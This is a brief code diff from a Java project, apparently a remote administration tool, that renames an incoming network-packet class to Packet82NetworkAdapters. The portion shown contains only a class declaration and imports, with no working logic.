@@ -10,7 +10,7 @@ import com.redpois0n.Connection;
 import com.redpois0n.stub.packets.outgoing.Packet56NetworkAdapter;
 
 
-public class PacketLISTAD extends AbstractIncomingPacket {
+public class Packet82NetworkAdapters extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
